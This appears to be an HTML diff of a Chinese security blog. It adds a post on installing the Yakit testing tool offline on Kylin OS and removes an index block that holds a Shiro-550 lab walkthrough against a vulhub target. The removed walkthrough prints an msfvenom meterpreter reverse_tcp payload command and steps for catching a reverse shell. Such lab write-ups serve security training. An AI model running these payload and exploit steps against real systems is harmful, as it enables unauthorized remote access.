@@ -19,22 +19,40 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"boqiqibo.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
 
-    <meta property="og:type" content="website">
+    <meta name="description" content="前言一些金融证券公司，以及一些企事业单位，要求使用国产化操作系统，比如麒麟。同时，应公司要求，使用正版软件。王小明最喜欢的Burpsuite用不了了，他也不喜欢用受限制的社区版。作为平替，使用了Yakit。 由于公司内网环境一般都不出网，安装过程中无需联网。提前准备：  Yakit arm64 安装包 Yakit 常用插件  下载下载地址：https:&#x2F;&#x2F;yaklang.com&#x2F; 如果是amd的L">
+<meta property="og:type" content="article">
 <meta property="og:title" content="安全，从入门到入土">
-<meta property="og:url" content="https://boqiqibo.github.io/index.html">
+<meta property="og:url" content="https://boqiqibo.github.io/2025/04/23/%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E9%BA%92%E9%BA%9F%E5%AE%89%E8%A3%85yakit/index.html">
 <meta property="og:site_name" content="安全，从入门到入土">
+<meta property="og:description" content="前言一些金融证券公司，以及一些企事业单位，要求使用国产化操作系统，比如麒麟。同时，应公司要求，使用正版软件。王小明最喜欢的Burpsuite用不了了，他也不喜欢用受限制的社区版。作为平替，使用了Yakit。 由于公司内网环境一般都不出网，安装过程中无需联网。提前准备：  Yakit arm64 安装包 Yakit 常用插件  下载下载地址：https:&#x2F;&#x2F;yaklang.com&#x2F; 如果是amd的L">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaH8KEQSrJWGOeMiaKIqVBAemNdqjr4A9NaiagGUOnkbicIkibXGYDOftH5EA/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaHr3FfeK9mLVibGmGU7yMLST8Ria9xpCYmiaU1ZL1sU6RnMsElbrKASBx2w/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaHUyJ1MzCkxsOh8vThYQVot4eQtZ8RRedDlXjvuVXjS02JiaOwgm2Um3A/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaHSVcojot5zKCnA9nMSW5Fup6zGQX28MFvib6snRDGuvDoFiblJbeAp1LA/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaHYGxIib70CthgZZtVZosyPibiathhNBT9kB7BCO9x7zZ0sjibz3sYjgqMrQ/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaH5Mx7tehe56gmAA1tp85Ln5uRDTMwiaBn4Hkibh8uhzcy9183ibNmOZJWw/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaHu2rdv4eGBV5PcemT9gQzVhWfqBpoibJYH5hq6AncpPTzC5mVOibJUAvA/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaHYWZ2rLicmescpCNakpQmAG051JPavsy11msovs1PUohPia52ChUkJWSg/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaHcsX0DKJicRlILEhSuTmkzAL3rbCp784brD6BcLLuiaYibdntV08ZYE2eA/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaHZomkfjibGQ93oSbicCz2N1HhwNWFszxOK1Mv5CGic1Q05d5PcXDf0YmyQ/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaHhNiaWHkFfPvIdUcGLeHF4ShvLdn5oA1qpuEtFLQlicCjhdYctiabwOsxQ/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaH0G46G5Bia1WNPF6mzZblYjMAz4smJx1f1lHQRicIIyWHjkKmmnQSB6Fg/0?from=appmsg">
+<meta property="og:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaHVkNKmXS2tgJvOsBcPrjHHb3mYQZSjFjywRPWmFpickAxt3jndzalX0g/0?from=appmsg">
+<meta property="article:published_time" content="2025-04-23T10:57:04.368Z">
+<meta property="article:modified_time" content="2025-04-23T10:51:44.102Z">
 <meta property="article:author" content="D4C">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaH8KEQSrJWGOeMiaKIqVBAemNdqjr4A9NaiagGUOnkbicIkibXGYDOftH5EA/0?from=appmsg">
 
 
-<link rel="canonical" href="https://boqiqibo.github.io/">
+<link rel="canonical" href="https://boqiqibo.github.io/2025/04/23/%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E9%BA%92%E9%BA%9F%E5%AE%89%E8%A3%85yakit/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://boqiqibo.github.io/2025/04/23/%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E9%BA%92%E9%BA%9F%E5%AE%89%E8%A3%85yakit/","path":"2025/04/23/在不出网的麒麟安装yakit/","title":""}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>安全，从入门到入土</title>
+<title> | 安全，从入门到入土</title>
   
 
 
@@ -85,7 +103,7 @@
 
     <a href="/" class="brand" rel="start">
       <i class="logo-line"></i>
-      <h1 class="site-title">安全，从入门到入土</h1>
+      <p class="site-title">安全，从入门到入土</p>
       <i class="logo-line"></i>
     </a>
   </div>
@@ -111,7 +129,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -124,6 +142,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">3.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#yakit%E5%AF%BC%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%92%E4%BB%B6"><span class="nav-number">4.</span> <span class="nav-text">yakit导入本地插件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%87%BA%E6%8F%92%E4%BB%B6"><span class="nav-number">4.1.</span> <span class="nav-text">导出插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%85%A5%E6%8F%92%E4%BB%B6"><span class="nav-number">4.2.</span> <span class="nav-text">导入插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MITM%E6%8A%93%E5%8C%85"><span class="nav-number">4.3.</span> <span class="nav-text">MITM抓包</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -158,16 +177,17 @@
 
     </div>
 
-    <div class="main-inner index posts-expand">
+    <div class="main-inner post posts-expand">
 
-    
+
+  
 
 
 <div class="post-block">
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://boqiqibo.github.io/2025/04/23/%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E9%BA%92%E9%BA%9F%E5%AE%89%E8%A3%85yakit/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -185,9 +205,9 @@
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/04/23/%E5%9C%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E9%BA%92%E9%BA%9F%E5%AE%89%E8%A3%85yakit/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
 
         <div class="post-meta-container">
           <div class="post-meta">
@@ -202,6 +222,13 @@
     </span>
 
   
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
 </div>
 
         </div>
@@ -210,8 +237,7 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一些金融证券公司，以及一些企事业单位，要求使用国产化操作系统，比如麒麟。同时，应公司要求，使用正版软件。<br>王小明最喜欢的Burpsuite用不了了，他也不喜欢用受限制的社区版。<br>作为平替，使用了Yakit。</p>
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一些金融证券公司，以及一些企事业单位，要求使用国产化操作系统，比如麒麟。同时，应公司要求，使用正版软件。<br>王小明最喜欢的Burpsuite用不了了，他也不喜欢用受限制的社区版。<br>作为平替，使用了Yakit。</p>
 <p>由于公司内网环境一般都不出网，安装过程中无需联网。<br>提前准备：</p>
 <ul>
 <li>Yakit arm64 安装包</li>
@@ -239,7 +265,6 @@
 <p>而纯净环境的麒麟系统，没有chrome浏览器，只有奇安信浏览器，可以选择开启系统代理<br><img src="http://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrjAs4d9hMic90uxibu43r2KiaHVkNKmXS2tgJvOsBcPrjHHb3mYQZSjFjywRPWmFpickAxt3jndzalX0g/0?from=appmsg" alt="0fee7c1ad70081af341b82141a41433d.png"></p>
 <p>或者在麒麟上安装chrome的arm版本的软件包。</p>
 
-      
     </div>
 
     
@@ -247,103 +272,41 @@
     
 
     <footer class="post-footer">
-        <div class="post-eof"></div>
-      
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.png">
+      </div>
+  </div>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/04/09/yakit-shiro-550-%E8%BF%94%E8%BF%9Eshell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="yakit shiro-550 返连shell命令执行">
+                  <i class="fa fa-angle-left"></i> yakit shiro-550 返连shell命令执行
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
     </footer>
   </article>
 </div>
 
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://boqiqibo.github.io/2025/04/09/yakit-shiro-550-%E8%BF%94%E8%BF%9Eshell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="D4C">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全，从入门到入土">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 安全，从入门到入土">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/04/09/yakit-shiro-550-%E8%BF%94%E8%BF%9Eshell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">yakit shiro-550 返连shell命令执行</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2025-04-09 22:04:16 / 修改时间：23:15:14" itemprop="dateCreated datePublished" datetime="2025-04-09T22:04:16+08:00">2025-04-09</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天以vulhub的shiro的案例，介绍一下yakit的<code>反向连接</code>功能。</p>
-<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
-<li>ubutnu22</li>
-<li>docker</li>
-<li>vulhub <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437">https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437</a></li>
-</ul>
-<p><strong>IP</strong><br>ubuntu 192.168.56.31<br>yakit所在主机 192.168.56.1</p>
-<h2 id="shiro-探测"><a href="#shiro-探测" class="headerlink" title="shiro 探测"></a>shiro 探测</h2><p>MITM 开启 shiro自定义检测<br><img src="/images/1bc61547b7f54842247412e19979cfb9.png" alt="1bc61547b7f54842247412e19979cfb9.png"></p>
-<p>勾选rememberme，输入随便什么账号密码，抓包<br><img src="/images/9f398c0ea193fb717f771a55c867ee46.png" alt="9f398c0ea193fb717f771a55c867ee46.png"><br>在yakit菜单栏的“bug”上，能看到已经检测到shiro默认key。<br><img src="/images/cb52e92fdcbbc622368f97e1a316ec30.png" alt="cb52e92fdcbbc622368f97e1a316ec30.png"><br>查看详情<br><img src="/images/2e56abed0c5af1345f6d2b0819b87ab6.png" alt="2e56abed0c5af1345f6d2b0819b87ab6.png"><br>接下来，让我们通过yakit内置的利用链，反弹shell。</p>
-<h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h2><p>代码生成器本文没用到，但我觉得还是介绍一下。它相当于将常见的反弹shell命令集成到一块。真不愧是个综合平台。</p>
-<h3 id="代码生成器"><a href="#代码生成器" class="headerlink" title="代码生成器"></a>代码生成器</h3><p>生成反向连接的代码<br><img src="/images/bc5a603fe53d0c211f713906f6d15646.png" alt="bc5a603fe53d0c211f713906f6d15646.png"></p>
-<p><strong>MSF版本</strong><br><img src="/images/385ff872465cc501491d614203a00c7d.png" alt="385ff872465cc501491d614203a00c7d.png"><br>结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=8085 -f elf -o reverse.elf</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="开启端口监听"><a href="#开启端口监听" class="headerlink" title="开启端口监听"></a>开启端口监听</h3><p><img src="/images/266c5ca4f1e987e264a4e3157a3764a6.png" alt="266c5ca4f1e987e264a4e3157a3764a6.png"></p>
-<p>监听中……<br><img src="/images/3d489980a40b0bb71b8fa308e44f2f2e.png" alt="3d489980a40b0bb71b8fa308e44f2f2e.png"></p>
-<p>我们选择下图标记1的Yso-Java-hack，生成利用链，添加反向连接的IP和端口<br><img src="/images/1210c615d93e5f47d1edea37f7b3201e.png" alt="1210c615d93e5f47d1edea37f7b3201e.png"></p>
-<p>代码发送到yak runner模块，因为yakit默认的利用代码就是shiro。所以我们不需要做太多的更改，只要取消注释，添加目标URL参数。<br><img src="/images/fc4555b7cc3e2dc828d2410e911be603.png" alt="fc4555b7cc3e2dc828d2410e911be603.png"><br>目标URL，点击右上角的执行<br><img src="/images/420aa1480073d43e4ec35cf195db8801.png" alt="420aa1480073d43e4ec35cf195db8801.png"></p>
-<p>此时，查看监听器，可以看到有来自192.168.56.32反向连接<br><img src="/images/504244ae86cd86fdf52754e2a33a1d1a.png" alt="504244ae86cd86fdf52754e2a33a1d1a.png"></p>
-<p><strong>注意</strong>：如果你此时无法在终端输入信息，把右上角的原始模式关掉</p>
-<p><img src="/images/4a20e55d59b2f33c82095c3bef92350f.png" alt="4a20e55d59b2f33c82095c3bef92350f.png"></p>
-<p>此时，就可以直接使用了<br><img src="/images/f2c8c77fd20ac368f4fa2c390782fc2d.png" alt="f2c8c77fd20ac368f4fa2c390782fc2d.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
 
 
 
